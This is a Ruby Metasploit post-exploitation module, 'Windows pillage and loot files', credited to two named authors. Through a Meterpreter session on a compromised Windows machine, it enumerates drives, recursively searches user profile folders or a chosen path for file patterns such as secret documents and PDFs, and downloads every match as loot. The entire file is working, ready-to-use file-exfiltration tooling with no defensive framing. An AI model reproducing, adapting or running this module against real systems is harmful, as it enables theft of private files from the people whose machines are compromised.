require 'msf/core'
require 'msf/core/post/file'
class Metasploit3 < Msf::Post

	include Msf::Post::File
	include Msf::Auxiliary::Report
	
	def initialize(info={})
		super( update_info( info,
			'Name'          => 'Windows pillage and loot files',
			'Description'   => %q{ This module gathers files based on pattern match and stores the information/file in loot. },
			'License'       => MSF_LICENSE,
			'Author'        => [ '3vi1john <Jbabio[at]me.com>', 'RageLtMan <rageltman[at]sempervictus>'],
			'Version'       => '$Revision: 30 $',
			'Platform'      => [ 'windows' ],
			'SessionTypes'  => [ 'meterpreter' ]
		))

		register_options(
			[
				OptBool.new(  'GETDRIVES', [ false, 'Search for a list of drives and display drive letters.', false]),
				OptString.new(  'SEARCH_FROM', [ false, 'Search from a specified location. Ex. C:\\, Run GETDRIVES first.']),
				OptString.new(  'FILE_GLOBS', [ false, 'The file pattern globs to search for, comma separated. (e.g. *secret*.doc?,*.pdf)'])
			], self.class)
	end

	def get_drives
	##All Credit Goes to mubix for this railgun-FU
		a = client.railgun.kernel32.GetLogicalDrives()["return"]
		drives = []
		letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		(0..25).each do |i|
			test = letters[i,1]
			rem = a % (2**(i+1))
				if rem > 0
				drives << test
				a = a - rem
				end
			end
			print_status("Drives Available = #{drives.inspect}")
	end

	def download_files(file_type=nil) 
		if file_type.nil?
			print_error("Nothing to search for")
			return
		end
		location = datastore['SEARCH_FROM']
		sysdriv = client.fs.file.expand_path("%SYSTEMDRIVE%")
		sysnfo = client.sys.config.sysinfo['OS']	
		profile_path_old = sysdriv + "\\Documents and Settings\\"		
 		profile_path_new = sysdriv + "\\Users\\"
		if location
			print_status("Searching #{location}")			
			getfile = client.fs.file.search(location,file_type,recurse=true,timeout=-1)
		elsif sysnfo =~/(Windows XP|2003|.NET)/
			print_status("Searching #{profile_path_old} through windows user profile structure")      			
			getfile = client.fs.file.search(profile_path_old,file_type,recurse=true,timeout=-1)
    		else sysnfo =~/(Windows 7|Windows Vista|2008)/
			print_status("Searching #{profile_path_new} through windows user profile structure")      			
			getfile = client.fs.file.search(profile_path_new,file_type,recurse=true,timeout=-1)
		end		
		getfile.each do |file|
			ctype = ""
			filename = "#{file['path']}\\#{file['name']}"		
			data = read_file(filename)
			print_status("Downloading #{file['path']}\\#{file['name']}")
			store_loot("files.found", ctype, session, data, filename, "Downloaded Files")
			end
		
	end

	def run
		begin
			if datastore['GETDRIVES']
				get_drives
			end
			if datastore['FILE_GLOBS'] == nil
				print_status("You must enter a pattern or file type to search for...")
			else			
				datastore['FILE_GLOBS'].split(",").each do |glob|
				download_files(glob)
			end			
			
			end
			print_status("Done!")
		end
		rescue::Rex::Post::Meterpreter::RequestError => e
		
		end
	
end
